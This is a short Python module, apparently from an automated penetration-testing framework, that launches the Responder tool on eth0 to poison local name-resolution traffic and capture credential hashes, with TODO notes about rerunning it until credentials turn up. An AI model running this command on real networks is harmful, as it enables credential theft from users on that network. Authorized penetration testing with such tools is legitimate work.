from core.actionModule import actionModule
from core.utils import Utils


class responder(actionModule):
    def __init__(self, config, display, lock):
        super(responder, self).__init__(config, display, lock)
        self.title = "Run Responder and watch for hashes"
        self.shortName = "Responder"
        self.description = "execute [reponder -I eth0 -wrf]"

        self.requirements = ["responder", "disabled"]
        self.triggers = ["always"]

        self.safeLevel = 5

        self.maxThreads = 1

    def process(self):
        temp_file = self.config["proofsDir"] + self.shortName + "_" + Utils.getRandStr(10)

        command = "responder -I eth0 -wrf"
        # run for 15 minutes
        # result = Utils.execWait(command, temp_file, timeout=900)
        result = Utils.execWait(command, temp_file, timeout=60)

        # TODO
        # check to see if we got any creds 
        # if not, wait 5 minutes and run again for 15 minutes

        # repeat upto 5 4 times
        return
